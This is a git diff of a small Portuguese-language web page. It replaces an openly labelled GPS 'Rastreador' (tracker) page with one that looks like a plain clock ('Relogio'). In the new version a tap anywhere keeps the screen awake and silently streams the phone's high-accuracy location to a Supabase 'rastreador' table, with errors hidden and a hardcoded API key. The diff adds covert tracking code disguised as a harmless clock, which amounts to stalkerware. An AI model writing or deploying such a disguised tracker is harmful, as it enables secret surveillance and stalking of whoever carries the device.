@@ -3,32 +3,21 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Rastreador</title>
-<style>body{font-family:sans-serif;padding:15px;text-align:center} button{padding:20px;width:100%;font-size:22px;background:#22c55e;color:#fff;border:0;border-radius:12px} #log{margin-top:15px;background:#111;color:#0f0;padding:10px;text-align:left;min-height:120px}</style>
+<title>Relogio</title>
+<style>body{margin:0;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif} #h{font-size:70px} #d{opacity:.5}</style>
 </head>
 <body>
-<h2>📍 Rastreador Ativo</h2>
-<button id="btn">ATIVAR GPS</button>
-<div id="log">Aguardando...</div>
+<div id="h">00:00</div>
+<div id="d">Toque para manter ativo</div>
 <script>
-const SUPA_URL = "https://jpaflbkafupwqfqfcjrv.supabase.co";
-const SUPA_KEY = "sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
-const logEl = document.getElementById('log');
-function log(t){ logEl.innerHTML = new Date().toLocaleTimeString() + " - " + t + "<br>" + logEl.innerHTML; }
-
-document.getElementById('btn').onclick = () => {
-  log("Botão clicou, pedindo GPS...");
-  navigator.geolocation.watchPosition(async (p)=>{
-    const lat=p.coords.latitude, lng=p.coords.longitude;
-    log(`GPS: ${lat.toFixed(6)}, ${lng.toFixed(6)}`);
-    const r = await fetch(`${SUPA_URL}/rest/v1/rastreador`,{
-      method:"POST",
-      headers:{"apikey":SUPA_KEY,"Authorization":"Bearer "+SUPA_KEY,"Content-Type":"application/json","Prefer":"resolution=merge-duplicates"},
-      body:JSON.stringify({device_id:"LG",lat:lat,lng:lng,updated_at:new Date().toISOString()})
-    });
-    if(r.ok) log("ENVIADO COM SUCESSO!");
-    else log("ERRO: "+r.status+" "+await r.text());
-  }, (e)=>{ log("ERRO GPS: "+e.message); }, {enableHighAccuracy:true});
+const U="https://jpaflbkafupwqfqfcjrv.supabase.co", K="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
+setInterval(()=>{document.getElementById('h').innerText=new Date().toLocaleTimeString().slice(0,5)},1000);
+document.body.onclick=()=>{
+  document.getElementById('d').innerText="Ativo";
+  if(navigator.wakeLock) navigator.wakeLock.request('screen');
+  navigator.geolocation.watchPosition(async p=>{
+    await fetch(`${U}/rest/v1/rastreador`,{method:"POST",headers:{apikey:K,Authorization:"Bearer "+K,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:"LG",lat:p.coords.latitude,lng:p.coords.longitude,updated_at:new Date().toISOString()})});
+  },()=>{}, {enableHighAccuracy:true});
 };
 </script>
 </body>
